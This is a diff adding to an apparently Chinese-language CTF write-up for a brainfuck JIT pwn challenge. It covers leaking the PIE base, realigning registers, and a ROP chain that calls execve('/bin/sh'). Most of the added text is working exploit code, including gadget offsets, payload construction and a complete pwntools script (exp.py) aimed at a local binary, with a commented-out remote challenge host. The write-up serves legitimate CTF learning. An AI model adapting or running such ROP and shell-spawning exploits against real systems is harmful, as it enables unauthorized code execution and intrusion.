@@ -180,6 +180,221 @@ payload1 = payload1.ljust(calcLen(payload2), b'_')
 
 ### 泄露`PIE`偏移
 
-程序实现的`jit`中将`rcx`用于定位写入的地址，一开始的想法是将`rcx`劫持到一块可写可执行的内存区域进行`ret2shellcode`，但是程序中并没有找到合适的空间，同时程序的`plt`表上什么也没有，就只能考虑更麻烦的`ROP`，由于`PIE`的存在，第一步自然是泄露`elf`基址:
+程序实现的`jit`中将`rcx`用于定位写入的地址，一开始的想法是将`rcx`劫持到一块可写可执行的内存区域进行`ret2shellcode`，但是程序中并没有找到合适的空间，同时程序的`plt`表上什么也没有，就只能考虑更麻烦的`ROP`，由于`PIE`的存在，第一步自然是泄露`elf`基址:  
 
-0x10430
+调试发现`rcx`附近有几个特别的地址，它们末尾几位总是`430`，相对于`elf_base`是固定的且`offset=0x10430`，就可以借助`brainfuck`中`.`逐字节泄露:  
+
+```py
+payload2 += b'[>.,],'
+# previous_exploit
+for i in range(7):
+	sn(b'a')
+	rn(1)
+for i in range(11):
+	leak_addr = b''
+	for i in range(8):
+		sn(b'a')
+		leak_addr += rn(1)
+	leak_addr = uu64(leak_addr)
+	lg("leak_addr")
+lg("leak_addr")
+elf_base = leak_addr - 0x10430
+```
+
+这样就可以通过偏移来构造`ROP`了.
+
+--------
+
+但是刚刚泄露时循环`>`修改了`rbx`，因此通过`b'[<,],'`将`rbx`归零:   
+
+```py
+payload2 += b'[<,],'
+# previous_exploit
+sn(b'\x00')
+for i in range(0x5f):
+	sn(b'a')
+sn(b'\x00')
+```
+
+--------
+
+### ROP
+
+进一步调试，发现程序最后`ret_addr`距离`rcx`还有一段偏移，因此考虑再最初多`pop`几次`rax`:  
+
+```py
+# previous
+for i in range((0x7ffe79705030-0x7ffe79704e90) // 8):
+	sn(b'a')
+```
+
+--------
+
+接下来就是`ROP`利用了:  
+
+```py
+def ROP(base):
+	pop_rdi_ret = 0x711d + base
+	mov_rdx_rdi_ret = 0x103F2 + base
+	pop_rsi_ret = 0x7285 + base
+	pop_rax_ret = 0x10143 + base
+	syscall = 0x10847 + base
+	buffer = 0x62078 + base
+	or_rax_rcx_ret = 0x41a73 + base
+	magic1 = 0x40512 + base
+	magic2 = 0x404ba + base
+	payload = p64(0) # pop rbx
+	payload += p64(pop_rax_ret) + p64(0) # ret
+	payload += p64(or_rax_rcx_ret)
+	payload += p64(pop_rsi_ret) + p64(0xC0)
+	payload += p64(pop_rdi_ret) + p64(buffer - 0x18)
+	payload += p64(magic1) # [buffer] = rcx + 0xC0
+
+	payload += p64(pop_rdi_ret) + p64(0)
+	payload += p64(mov_rdx_rdi_ret) # rdx = 0
+	payload += p64(pop_rsi_ret) + p64(0) # rsi = 0
+	payload += p64(pop_rdi_ret) + p64(buffer - 8)
+	payload += p64(magic2) + p64(0) # rdi = [buffer] = rcx + 0xC0
+	payload += p64(pop_rax_ret) + p64(59) # rax = 59
+	payload += p64(syscall)
+	payload += b'/bin/sh\x00' * 10
+	for i in payload:
+		sn(p8(i) + b'a')
+	sn(b'\x00'*2)
+```
+
+--------
+
+## exp.py
+
+```py
+#!/usr/bin/python3
+#-*- coding: utf-8 -*-
+from pwn import *
+
+context.log_level = 'debug'
+context.arch='amd64'
+context.terminal = ['tmux','sp','-h','-l','120']
+
+remote_service = "cha.hackpack.club 20994"
+remote_service = remote_service.strip().split(" ")
+# p = remote(remote_service[0], int(remote_service[1]))
+filename = "./pwn"
+p = process(filename)
+e = ELF(filename, checksec=False)
+l = ELF(e.libc.path, checksec=False)
+
+rl = lambda a=False : p.recvline(a)
+ru = lambda a,b=True : p.recvuntil(a,b)
+rn = lambda x : p.recvn(x)
+sn = lambda x : p.send(x)
+sl = lambda x : p.sendline(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a,b)
+irt = lambda : p.interactive()
+dbg = lambda text=None : gdb.attach(p, text)
+lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
+uu32 = lambda data : u32(data.ljust(4, b'\x00'))
+uu64 = lambda data : u64(data.ljust(8, b'\x00'))
+def debugPID():
+    lg("p.pid")
+    input()
+def sendPayload(payload):
+	ru(b'program length: ')
+	sl(str(len(payload)).encode())
+	ru(b'program source: ')
+	sn(payload)
+def calcLen(payload):
+	initSum = 0
+	for i in payload.decode():
+		if 	 i == '[' or i == ']':
+			initSum += 0xa
+		elif i == '+' or i == '-':
+			initSum += 0x3
+		elif i == '>' or i == ',':
+			initSum += 0x1d
+		elif i == '<':
+			initSum += 0x17
+		elif i == '.':
+			initSum += 0x25
+		else:
+			initSum += 0x1
+	return initSum
+
+def ROP(base):
+	pop_rdi_ret = 0x711d + base
+	mov_rdx_rdi_ret = 0x103F2 + base
+	pop_rsi_ret = 0x7285 + base
+	pop_rax_ret = 0x10143 + base
+	syscall = 0x10847 + base
+	buffer = 0x62078 + base
+	or_rax_rcx_ret = 0x41a73 + base
+	magic1 = 0x40512 + base
+	magic2 = 0x404ba + base
+	payload = p64(0) # pop rbx
+	payload += p64(pop_rax_ret) + p64(0) # ret
+	payload += p64(or_rax_rcx_ret)
+	payload += p64(pop_rsi_ret) + p64(0xC0)
+	payload += p64(pop_rdi_ret) + p64(buffer - 0x18)
+	payload += p64(magic1) # [buffer] = rcx + 0xC0
+
+	payload += p64(pop_rdi_ret) + p64(0)
+	payload += p64(mov_rdx_rdi_ret) # rdx = 0
+	payload += p64(pop_rsi_ret) + p64(0) # rsi = 0
+	payload += p64(pop_rdi_ret) + p64(buffer - 8)
+	payload += p64(magic2) + p64(0) # rdi = [buffer] = rcx + 0xC0
+	payload += p64(pop_rax_ret) + p64(59) # rax = 59
+	payload += p64(syscall)
+	payload += b'/bin/sh\x00' * 10
+	for i in payload:
+		sn(p8(i) + b'a')
+	sn(b'\x00'*2)
+
+payload1 = b'_'*0x11 + b'[' + b'_'*0x14 + b'['
+payload2 = b',,,],],' + b'[>.,],' + b'[<,],' + b'[,>,],'
+payload1 = payload1.ljust(calcLen(payload2), b'_')
+
+sendPayload(payload1)
+sendPayload(payload2)
+
+sn(b'a'*2)
+for i in range(4):
+	sn(b'a')
+sn(b'\x00')
+
+sn(b'a')
+sn(b'\x00')
+
+######
+# lifting rsp to adjust it to rcx in the end
+for i in range((0x7ffe79705030-0x7ffe79704e90) // 8):
+	sn(b'a')
+######
+
+sn(b'\x00')
+sn(b'\x00')
+
+for i in range(7):
+	sn(b'a')
+	rn(1)
+for i in range(11):
+	leak_addr = b''
+	for i in range(8):
+		sn(b'a')
+		leak_addr += rn(1)
+	leak_addr = uu64(leak_addr)
+	lg("leak_addr")
+lg("leak_addr")
+elf_base = leak_addr - 0x10430
+
+sn(b'\x00')
+for i in range(0x5f):
+	sn(b'a')
+sn(b'\x00')
+
+debugPID()
+sn(b'a')
+ROP(elf_base)
+
+irt()
+```
